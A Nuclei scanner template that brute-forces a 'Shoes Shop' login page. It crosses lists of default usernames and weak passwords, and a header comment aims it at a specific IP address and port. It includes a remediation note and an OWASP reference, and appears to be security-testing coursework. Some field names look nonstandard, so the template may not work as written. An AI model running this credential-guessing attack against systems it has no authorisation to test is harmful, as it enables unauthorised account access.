# nuclei -u http://103.90.225.135:8001 -t Bruteforce-Shoes-Shop.yaml -p http://127.0.0.1:8080
info:
  id: Bruteforce-Shoes-Shop
  name: Bruteforce Shoes Shop Login Page
  author: Hung, Dat, Hoa, Danh
  severity: high
  description: Shoes Shop check some login credentials
  remediation: Change to more powerfull password. These passwords and users are default credentials which are weak and can easily be guessed.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials
  tags: bruteforce,shoes-shop
  
requests:
  - request:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Origin: {{BaseURL}}
        Connection: close
        Referer: {{BaseURL}}/login
        Upgrade-Insecure-Requests: 1

        username={{username}}&password={{password}}&submit=Login

    payloads:
      username:
        - admin
        - apache
        - tomcat
        - root
        - tomcat
        - demo
        - role1
        - both
        - tony

      password:
        - admin
        - apache
        - tomcat
        - password123
        - 123456789
        - ADMIN
        - demo
        - s3cret
        - iloveyou
        - 123456

    scanMode: clusterbomb  # Available options: sniper, pitchfork and clusterbomb
    redirect: true

    multipleMatcher: and
    matchers:
      - type: word
        part: body
        word:
          - "Login Success"
        condition: and

      - type: status
        status:
          - 200
    exposer:
      - type: regex
        part: all
        regex:
          - section[a-zA-Z ]+
